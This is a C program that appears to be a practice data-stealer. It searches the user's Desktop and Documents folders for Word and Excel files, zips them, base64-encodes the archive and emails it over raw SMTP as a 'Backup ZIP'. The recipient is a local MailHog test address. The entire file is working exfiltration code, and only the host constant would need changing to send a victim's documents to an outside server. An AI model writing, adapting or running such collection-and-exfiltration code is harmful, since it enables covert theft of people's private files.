#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <arpa/inet.h>

#include <sys/wait.h>

#define SMTP_HOST "127.0.0.1"
#define SMTP_PORT 1025
#define BOUNDARY "BOUNDARY123"

static const char b64_table[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

typedef struct
{
    char **files;
    size_t count;
} FileList;

FileList g_files = {0};

/*=================GLOBAL COUNTER==================*/
static int found_count = 0;

/*=================SCAN FOLDER===================*/

void add_file(const char *path);

void scan_folder(const char *path)
{
    DIR *dir = opendir(path);
    if (!dir)
        return;

    struct dirent *entry;

    while ((entry = readdir(dir)) != NULL)
    {
        if (strcmp(entry->d_name, ".") == 0 ||
            strcmp(entry->d_name, "..") == 0)
            continue;

        char fullpath[1024];
        snprintf(fullpath, sizeof(fullpath),
                 "%s/%s", path, entry->d_name);

        struct stat st;
        if (stat(fullpath, &st) != 0)
            continue;

        // Neu la folder thi de quy
        if (S_ISDIR(st.st_mode))
        {
            scan_folder(fullpath);
        }
        // Neu la file -> check duoi file
        else if (S_ISREG(st.st_mode))
        {
            size_t len = strlen(entry->d_name);
            if (len >= 5)
            {
                if (strcasecmp(entry->d_name + len - 5, ".docx") == 0 ||
                    strcasecmp(entry->d_name + len - 5, ".xlsx") == 0)
                {
                    printf("[FOUND] %s\n", fullpath);
                    found_count++;
                    add_file(fullpath);
                }
            }
        }
    }

    closedir(dir);
}

/*======================== GET XDG DIR ========================*/
int get_xdg_dir(const char *key, char *out, size_t out_size)
{
    const char *home = getenv("HOME");
    if (!home)
        return 0;

    char config_path[512];
    snprintf(config_path, sizeof(config_path), "%s/.config/user-dirs.dirs", home);

    FILE *f = fopen(config_path, "r");
    if (!f)
        return 0;

    char line[512];
    int found = 0;

    while (fgets(line, sizeof(line), f))
    {
        if (strncmp(line, key, strlen(key)) == 0)
        {
            char *start = strchr(line, '"');
            char *end = strrchr(line, '"');
            if (start && end && end > start)
            {
                size_t len = end - start - 1;
                if (len < out_size)
                {
                    strncpy(out, start + 1, len);
                    out[len] = '\0';
                    found = 1;
                }
            }

            break;
        }
    }
    fclose(f);

    /* Thay $HOME */
    if (found && strncmp(out, "$HOME", 5) == 0)
    {
        char tmp[512];
        snprintf(tmp, sizeof(tmp), "%s%s", home, out + 5);
        strncpy(out, tmp, out_size);
        out[out_size - 1] = '\0';
    }

    return found;
}

/*=================== ADD Files =======================*/
void add_file(const char *path)
{
    char **tmp = realloc(g_files.files, (g_files.count + 1) * sizeof(char *));
    if (!tmp)
        return;

    g_files.files = tmp;
    g_files.files[g_files.count] = strdup(path);
    if (!g_files.files[g_files.count])
        return;

    g_files.count++;
}

/*================= FREE Files List =================== */
void free_file_list(FileList *list)
{
    for (size_t i = 0; i < list->count; i++)
    {
        free(list->files[i]);
    }

    free(list->files);
    list->files = NULL;
    list->count = 0;
}

/*==================== ZIP FILES ======================*/
int zip_files(const char *zip_name, FileList *list)
{
    if (list->count == 0)
    {
        printf("[ZIP] No files to zip\n");
        return 0;
    }

    pid_t pid = fork();
    if (pid < 0)
    {
        perror("fork");
        return 0;
    }

    if (pid == 0)
    {
        /*CHILD PROCESS */

        // zip result.zip file1 file2 file3
        char **args = malloc((list->count + 3) * sizeof(char *));
        if (!args)
            exit(1);

        args[0] = "zip";
        args[1] = (char *)zip_name;

        for (size_t i = 0; i < list->count; i++)
            args[i + 2] = list->files[i];

        args[list->count + 2] = NULL;

        execvp("zip", args);

        perror("execvp(zip)");
        exit(1);
    }
    else
    {
        /* PARENT PROCESS */
        int status;
        waitpid(pid, &status, 0);

        if (WIFEXITED(status) && WEXITSTATUS(status) == 0)
        {
            printf("[ZIP] Created %s successfully\n", zip_name);
            return 1;
        }
        else
        {
            printf("[ZIP] Failed\n");
            return 0;
        }
    }
}

/*==================== Base64 encode ==================== */
char *base64_encode(const unsigned char *data, size_t len)
{
    char *out = malloc(len * 2);
    if (!out)
        return NULL;

    size_t i, j = 0;
    for (i = 0; i < len; i += 3)
    {
        unsigned int v = data[i];
        v = i + 1 < len ? (v << 8) | data[i + 1] : v << 8;
        v = i + 2 < len ? (v << 8) | data[i + 2] : v << 8;

        out[j++] = b64_table[(v >> 18) & 0x3F];
        out[j++] = b64_table[(v >> 12) & 0x3F];
        out[j++] = (i + 1 < len) ? b64_table[(v >> 6) & 0x3F] : '=';
        out[j++] = (i + 2 < len) ? b64_table[v & 0x3F] : '=';
    }
    out[j] = 0;
    return out;
}

/* ================= send mail =========================== */
void smtp_send(int sock, const char *s)
{
    send(sock, s, strlen(s), 0);
}

void smtp_recv(int sock)
{
    char buf[1024];
    recv(sock, buf, sizeof(buf), 0);
}

int main(void)
{

    char desktop[512];
    char documents[512];

    printf("====== Scan .docx / .xlxs files=======\n\n");

    if (get_xdg_dir("XDG_DESKTOP_DIR", desktop, sizeof(desktop)))
    {
        printf("Scanning Desktop: %s\n", desktop);
        scan_folder(desktop);
    }
    else
    {
        printf("Desktop directory not found (XDG)\n");
    }

    if (get_xdg_dir("XDG_DOCUMENTS_DIR", documents, sizeof(documents)))
    {
        printf("\nScanning Documents: %s\n", documents);
        scan_folder(documents);
    }
    else
    {
        printf("Documents directory not found (XDG)\n");
    }

    if (found_count == 0)
    {
        printf("\n[NOT FOUND] No .docx or .xlsx files found\n");
    }
    else
    {
        printf("\n[DONE] Total files found: %zu\n", g_files.count);
        zip_files("result.zip", &g_files);

        FILE *f = fopen("result.zip", "rb");
        if (!f)
        {
            perror("zip");
            return 1;
        }

        fseek(f, 0, SEEK_END);
        long size = ftell(f);
        rewind(f);

        unsigned char *data = malloc(size);
        fread(data, 1, size, f);
        fclose(f);

        char *b64 = base64_encode(data, size);
        free(data);

        /* ===== connect smtp ===== */
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in srv = {
            .sin_family = AF_INET,
            .sin_port = htons(SMTP_PORT)};
        inet_pton(AF_INET, SMTP_HOST, &srv.sin_addr);

        connect(sock, (struct sockaddr *)&srv, sizeof(srv));
        smtp_recv(sock);

        smtp_send(sock, "HELO localhost\r\n");
        smtp_recv(sock);
        smtp_send(sock, "MAIL FROM:<backup@local>\r\n");
        smtp_recv(sock);
        smtp_send(sock, "RCPT TO:<test@mailhog.local>\r\n");
        smtp_recv(sock);
        smtp_send(sock, "DATA\r\n");
        smtp_recv(sock);

        /* ===== headers ===== */
        smtp_send(sock,
                  "From: backup@local\r\n"
                  "To: test@mailhog.local\r\n"
                  "Subject: Backup ZIP\r\n"
                  "MIME-Version: 1.0\r\n"
                  "Content-Type: multipart/mixed; boundary=\"" BOUNDARY "\"\r\n"
                  "\r\n");

        /* ===== text ===== */
        smtp_send(sock,
                  "--" BOUNDARY "\r\n"
                  "Content-Type: text/plain\r\n\r\n"
                  "Backup attached.\r\n\r\n");

        /* ===== attachment ===== */
        smtp_send(sock,
                  "--" BOUNDARY "\r\n"
                  "Content-Type: application/zip\r\n"
                  "Content-Transfer-Encoding: base64\r\n"
                  "Content-Disposition: attachment; filename=\"result.zip\"\r\n\r\n");

        smtp_send(sock, b64);
        smtp_send(sock, "\r\n--" BOUNDARY "--\r\n.\r\n");
        smtp_recv(sock);

        smtp_send(sock, "QUIT\r\n");
        close(sock);
        free(b64);

        printf("[OK] Mail sent with ZIP attachment\n");

        free_file_list(&g_files);
        return 0;
    }

    return 0;
}